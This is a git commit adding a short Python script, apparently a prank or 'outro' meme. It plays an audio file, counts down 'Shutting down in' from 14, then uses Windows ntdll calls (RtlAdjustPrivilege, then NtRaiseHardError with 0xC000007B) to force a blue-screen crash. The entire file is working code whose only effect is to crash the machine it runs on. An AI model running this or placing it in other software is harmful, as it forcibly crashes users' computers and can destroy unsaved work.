e27d23d8158793c67ab69653db5c7b35698779e7
Max <55332100+Maxb0tbeep@users.noreply.github.com>
2022-09-09 18:50:56 +0000

    Initial commit

---
+++ main.py
@@ -0,0 +1,34 @@
+from playsound import playsound
+from ctypes import windll
+from ctypes import c_int
+from ctypes import c_uint
+from ctypes import c_ulong
+from ctypes import POINTER
+from ctypes import byref
+import time
+
+playsound('outro.mp3')
+
+for i in range(14):
+  countdown = 14 - i
+  print("Shutting down in",countdown)
+  i+=1
+  time.sleep(1)
+
+nullptr = POINTER(c_int)()
+
+windll.ntdll.RtlAdjustPrivilege(
+    c_uint(19), 
+    c_uint(1), 
+    c_uint(0), 
+    byref(c_int())
+)
+
+windll.ntdll.NtRaiseHardError(
+    c_ulong(0xC000007B), 
+    c_ulong(0), 
+    nullptr, 
+    nullptr, 
+    c_uint(6), 
+    byref(c_uint())
+)
